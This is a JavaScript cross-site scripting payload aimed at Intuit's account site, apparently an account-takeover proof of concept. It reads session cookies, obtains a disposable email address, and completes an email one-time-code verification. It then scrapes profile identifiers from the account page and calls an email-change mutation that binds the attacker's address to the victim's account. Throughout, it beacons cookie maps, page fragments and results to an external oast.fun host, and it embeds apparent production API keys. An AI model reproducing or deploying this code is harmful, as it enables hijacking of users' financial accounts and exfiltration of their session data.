(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');

var initHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'Intuit_Interception':'ignore-response',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_authn_session_slot':'qbn',
'intuit_origin':'https://accounts.intuit.com',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('[*] session: '+session.substring(0,20)+'...');
log('');
log('[0] Getting temp email...');

wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Email: '+email);

log('[1] Initialize...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid);

log('[2] Polling OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw){
var resp=JSON.parse(raw);
var list=resp.list||[];
log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[2] OTP: '+otp);

log('[3] Verify...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no token');
var vt=vd.verifierToken;
log('[3] Got verifierToken');

log('[4] SignIn...');
var signInHdrs={};
for(var k in initHdrs)signInHdrs[k]=initHdrs[k];
signInHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation'}));

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}',
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:'qbn',tenantIds:['50000003'],verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
var srd;try{srd=JSON.parse(sr)}catch(e){}
var authId='';
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res&&res.authenticationSession&&res.authenticationSession.digitalIdentity){
authId=res.authenticationSession.digitalIdentity.legacyAuthId||'';
}
}
if(!authId)authId=gc('qbn.authid');
if(!authId)throw new Error('no authId');
log('[4] authId: '+authId);

log('[4.5] Searching for profileId...');

var cookies=document.cookie.split(';');
var uuidRe=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
var cookieMap={};
for(var ci=0;ci<cookies.length;ci++){
var pair=cookies[ci].trim().split('=');
var cname=pair[0];
var cval=decodeURIComponent(pair.slice(1).join('='));
var cuuids=cval.match(uuidRe);
if(cuuids){
for(var cu=0;cu<cuuids.length;cu++){
cookieMap[cuuids[cu]]=cname;
}
}
}
var cookieUuidKeys=Object.keys(cookieMap);
log('[4.5] Cookie UUIDs:');
for(var ck=0;ck<cookieUuidKeys.length;ck++){
log('  '+cookieMap[cookieUuidKeys[ck]]+' = '+cookieUuidKeys[ck]);
}
beacon('p26-cookie-map',JSON.stringify(cookieMap).substring(0,900));

log('[4.5] Fetching account page...');
return fetch('/app/account-manager/security',{credentials:'include',redirect:'follow'})
.then(function(r){return r.text()})
.then(function(html){
log('[4.5] HTML size: '+html.length);

var authIdIdx=html.indexOf(authId);
log('[4.5] authId in HTML: '+(authIdIdx>=0?'YES at '+authIdIdx:'NO'));
if(authIdIdx>=0){
var ctx=html.substring(Math.max(0,authIdIdx-200),Math.min(html.length,authIdIdx+200));
log('[4.5] Context around authId:');
log(ctx);
beacon('p26-authid-ctx',ctx);
}

var profileId='';
var pidIdx=html.indexOf('profileId');
if(pidIdx<0)pidIdx=html.indexOf('profile_id');
if(pidIdx<0)pidIdx=html.indexOf('profileid');
log('[4.5] "profileId" in HTML: '+(pidIdx>=0?'YES at '+pidIdx:'NO'));
if(pidIdx>=0){
var pctx=html.substring(Math.max(0,pidIdx-100),Math.min(html.length,pidIdx+200));
log('[4.5] Context: '+pctx);
beacon('p26-pid-ctx',pctx);
var pmatch=pctx.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);
if(pmatch)profileId=pmatch[0];
}

var allHtmlUuids=html.match(uuidRe)||[];
var unique={};
for(var hi=0;hi<allHtmlUuids.length;hi++)unique[allHtmlUuids[hi]]=1;
var ukeys=Object.keys(unique);
log('[4.5] Unique UUIDs in HTML: '+ukeys.length);
for(var uk=0;uk<Math.min(ukeys.length,15);uk++){
log('  '+ukeys[uk]+(cookieMap[ukeys[uk]]?' (cookie:'+cookieMap[ukeys[uk]]+')':''));
}
beacon('p26-html-uuids',ukeys.join(',').substring(0,900));

if(!profileId){
var inlineScripts=[];
var sre=/<script[^>]*>([\s\S]*?)<\/script>/gi;
var sm;
while((sm=sre.exec(html))!==null){
if(sm[1].length>50)inlineScripts.push(sm[1]);
}
log('[4.5] Inline scripts: '+inlineScripts.length);
for(var si=0;si<inlineScripts.length;si++){
var sc=inlineScripts[si];
if(sc.indexOf(authId)>=0){
log('[4.5] Script #'+si+' contains authId!');
var saidx=sc.indexOf(authId);
var sctx=sc.substring(Math.max(0,saidx-200),Math.min(sc.length,saidx+300));
log(sctx.substring(0,400));
beacon('p26-script-authid-'+si,sctx.substring(0,900));
var spm=sctx.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);
if(spm&&!profileId)profileId=spm[0];
}
if(sc.indexOf('profileId')>=0||sc.indexOf('profile_id')>=0){
log('[4.5] Script #'+si+' contains profileId ref!');
var spidx=sc.indexOf('profileId');
if(spidx<0)spidx=sc.indexOf('profile_id');
var spctx=sc.substring(Math.max(0,spidx-100),Math.min(sc.length,spidx+200));
log(spctx.substring(0,300));
beacon('p26-script-pid-'+si,spctx.substring(0,900));
var spm2=spctx.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);
if(spm2)profileId=spm2[0];
}
}
}

log('[4.5] Final profileId: '+(profileId||'(none from HTML)'));
beacon('p26-final-pid',profileId||'none');

var updateHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_routingid':authId,
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_tid':uuid()
};

var updateQuery='mutation UpdateEmailAddress($input:UpdateEmailAddressInput!){updateEmailAddress(request:$input){personInfo{contactInfo{emails{id active email variation{usage purposes{purpose}}}}}}}';

var candidates=[];
if(profileId)candidates.push(profileId);
for(var ui=0;ui<ukeys.length;ui++){
if(candidates.indexOf(ukeys[ui])<0)candidates.push(ukeys[ui]);
}
for(var ci2=0;ci2<cookieUuidKeys.length;ci2++){
if(candidates.indexOf(cookieUuidKeys[ci2])<0)candidates.push(cookieUuidKeys[ci2]);
}
log('[5] Trying '+candidates.length+' profileId candidates...');

function tryCandidate(idx){
if(idx>=candidates.length||idx>=5){
log('[!] All candidates failed');
beacon('p26-allfail','tried '+idx);
return Promise.resolve()
}
var pid=candidates[idx];
log('[5.'+idx+'] Trying: '+pid);
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:updateHdrs,credentials:'include',
body:JSON.stringify({
query:updateQuery,
variables:{input:{accountId:authId,emailAddress:{email:email,active:true,variation:{ordinal:'PRIMARY',usage:'OTHER',purposes:[{defaultPurpose:true,purpose:'OTHER'}]}},profileId:pid,id:authId}},
operationName:'UpdateEmailAddress'
})
}).then(function(r){return r.text()}).then(function(ur){
var urd;try{urd=JSON.parse(ur)}catch(e){}
if(urd&&urd.data&&urd.data.updateEmailAddress&&!urd.errors){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
log('=== profileId was: '+pid+' ===');
beacon('p26-done','SUCCESS email='+email+' pid='+pid);
return
}
var errMsg='';
if(urd&&urd.errors)errMsg=urd.errors[0].message||'';
log('[5.'+idx+'] Failed: '+errMsg.substring(0,150));
beacon('p26-try'+idx,errMsg.substring(0,400));
return tryCandidate(idx+1)
})
}

return tryCandidate(0)
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p26-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p26-crash?e='+encodeURIComponent(e.message);
}
})();
